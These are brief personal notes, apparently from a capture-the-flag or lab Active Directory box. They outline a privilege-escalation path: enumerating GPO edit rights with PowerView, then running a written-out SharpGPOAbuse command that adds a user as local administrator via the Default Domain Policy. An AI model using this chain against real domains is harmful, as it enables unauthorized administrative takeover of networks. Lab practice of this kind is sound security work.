### scf is not working
### URL file attack then
https://swepstopia.com/url-file-attack/

### Foothold
PowerView.ps1 -> Get-NetGPO to get GUID -> Get-GPPermission -> GpoEditDeleteModifySecurity

The entry labeled Permission shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named SharpGPOAbuse.

```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
```

Hacktricks' link is so old. Use this one then
`https://github.com/Flangvik/SharpCollection`


### Others
maybe try bloodhound rather than powerview since the gui is nice there.